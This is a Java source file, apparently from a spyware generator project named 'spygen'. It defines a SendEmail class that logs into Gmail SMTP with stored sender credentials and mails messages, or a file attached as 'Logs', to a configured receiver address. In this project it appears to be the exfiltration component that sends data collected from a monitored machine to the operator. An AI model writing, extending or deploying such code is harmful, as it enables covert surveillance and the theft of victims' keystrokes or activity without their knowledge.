package com.houarizegai.spygen.mail;

import java.io.File;
import java.io.IOException;

import com.houarizegai.spygen.global.Settings;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.apache.commons.mail.SimpleEmail;

public class SendEmail {
    
    private static final String SMTP = "SMTP.gmail.com";
    private static final String PORT = "587";
    private static final boolean SSL = true;
    private static final boolean DEBUG = true;

    public void sendSimpleEmail(String subject, String msg) {
        SimpleEmail email = new SimpleEmail();
        try {
            email.setDebug(DEBUG);
            email.setHostName(SMTP);
            email.setSSL(true);
            email.addTo(Settings.receiverMail);
            email.setFrom(Settings.senderMail);
            email.setAuthentication(Settings.senderMail, Settings.senderPassword);
            email.setSubject(subject);
            email.setMsg(msg);
            email.send();
        } catch (EmailException e) {
            e.printStackTrace();
        }
    }

    public void sendEmailAttachment(String subject, String msg, String file) {
        File fileLogs = new File(file);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(DEBUG);
            email.setHostName(SMTP);
            email.setSSL(SSL);
            email.addTo(Settings.receiverMail);
            email.setFrom(Settings.senderMail);
            email.setAuthentication(Settings.senderMail, Settings.senderPassword);
            email.setSubject(subject);
            email.setMsg(msg);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            e.printStackTrace();
        }
    }

}